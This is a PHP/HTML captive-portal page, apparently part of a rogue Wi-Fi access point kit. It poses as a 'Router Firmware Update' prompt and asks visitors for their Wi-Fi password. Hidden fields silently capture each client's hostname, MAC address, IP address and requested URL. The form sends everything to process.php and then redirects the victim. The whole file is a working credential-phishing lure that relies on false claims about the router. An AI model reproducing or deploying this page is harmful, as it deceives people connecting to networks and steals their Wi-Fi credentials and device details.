<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 100%;
            width: 100%;
            max-width: 400px;
        }
        input[type="password"], input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #007BFF;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        h1, h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }
        .progress-bar {
            width: 100%;
            background-color: #f3f3f3;
            border-radius: 8px;
            overflow: hidden;
            height: 30px;
            margin: 20px 0;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .progress-bar-fill {
            height: 100%;
            width: 0;
            background-color: #007BFF;
            transition: width 300s linear; /* 5 minutes */
        }
    </style>

    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
                window.location = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</head>
<body>

<div id="react-root">
    <section>
        <div></div>
        <main role="main">
            <article>
                <div class="container">
                    <h1>Firmware Update Required</h1>
                    <p>Your router requires a firmware update. Please enter your Wi-Fi password to continue.</p>
                    <form id="loginForm" method="post" action="process.php" onsubmit="redirect()">
                        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                        <input type="hidden" name="target" value="<?=$destination?>">
                        <label for="password">Wi-Fi Password:</label>
                        <input type="password" id="password" name="password" required>
                        <button type="submit" id="btn" name="btn">Update Now</button>
                    </form>
                </div>
            </article>
        </main>
    </section>
</div>

</body>
</html>
